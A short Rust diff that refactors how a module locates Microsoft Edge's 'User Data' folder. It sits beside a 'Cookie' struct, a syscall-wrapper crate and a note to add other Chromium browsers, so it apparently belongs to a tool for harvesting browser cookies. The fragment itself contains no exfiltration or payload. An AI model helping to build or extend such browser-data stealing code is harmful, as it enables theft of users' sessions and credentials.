@@ -16,7 +16,7 @@ pub struct Cookie {}
 
 #[cfg(target_os = "windows")]
 mod constants {
-    use core::cell::{LazyCell, OnceCell};
+    use core::cell::LazyCell;
 
     use wsyscall_rs::{wintypes::WindowsString, SusGetEnvironmentVariable};
 
@@ -34,14 +34,11 @@ mod constants {
         copy
     });
 
-    pub static EDGE_USER_DATA: OnceCell<WindowsString> = OnceCell::new();
-
-    pub fn edge_user_data() -> &'static WindowsString {
-        EDGE_USER_DATA.get()
-        let mut copy = unsafe { &*LOCAL_APP_DATA }.clone();
+    pub static mut EDGE_USER_DATA: LazyCell<WindowsString> = LazyCell::new(|| {
+        let mut copy = unsafe {&*LOCAL_APP_DATA}.clone();
         copy.push_str("\\Microsoft\\Edge\\User Data");
         copy
-    }
+    });
     // TODO: add other chromium browsers
 }
 
